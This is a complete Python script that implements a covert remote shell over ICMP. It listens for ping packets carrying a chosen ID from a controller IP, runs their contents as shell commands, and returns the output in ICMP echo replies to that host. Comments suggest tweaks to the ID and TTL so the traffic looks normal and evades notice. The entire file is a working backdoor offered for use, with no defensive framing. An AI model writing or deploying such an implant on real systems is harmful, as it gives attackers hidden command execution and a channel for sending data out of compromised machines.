#!/usr/bin/env python3

from scapy.all import sr, IP, ICMP, Raw, sniff
import sys
import subprocess

class IcmpShelly:
  
    def __init__(self, interface, destination_ip):
        self.ICMP_ID = 13170
        #self.ICMP_ID = 0xBEEF  # Looks more "normal" than 13170
        self.TTL = 64
        #self.TTL = 128         # Default Windows TTL
        self.MAX_OUTPUT = 1024
        self.interface = interface
        self.destination_ip = destination_ip
        self.running = False

    def execute_command(self, command):
       
        try:
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            output = ""
            if result.stdout:
                output += f"STDOUT:\n{result.stdout}"
            if result.stderr:
                output += f"\nSTDERR:\n{result.stderr}"
            return output[:self.MAX_OUTPUT]
        except Exception as e:
            return f"Command execution failed: {str(e)}"

    def handle_packet(self, pkt):
        
        if (pkt.haslayer(ICMP) and pkt.haslayer(Raw) and
                pkt[IP].src == self.destination_ip and
                pkt[ICMP].type == 8 and  # Echo request
                pkt[ICMP].id == self.ICMP_ID):

            try:
                command = pkt[Raw].load.decode('utf-8', errors='ignore').strip()
                if command:
                    print(f"\n[+] Executing: {command}")
                    output = self.execute_command(command)

                    response = IP(dst=self.destination_ip, ttl=self.TTL) / ICMP(
                        type=0,
                        id=self.ICMP_ID
                    ) / Raw(load=output)
                    sr(response, timeout=0, verbose=0)

            except Exception as e:
                print(f"[!] Error processing packet: {e}")

    def start(self):
        
        self.running = True
        print(f"[+] ICMP listener started (From: {self.destination_ip})")

        try:
            sniff(
                iface=self.interface,
                prn=self.handle_packet,
                filter="icmp",
                store=0
            )
        except KeyboardInterrupt:
            print("\n[+] Stopping listener...")
        finally:
            self.stop()

    def stop(self):
        self.running = False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <interface> <destination_ip>")
        sys.exit(1)

    shelly = IcmpShelly(sys.argv[1], sys.argv[2])
    shelly.start()
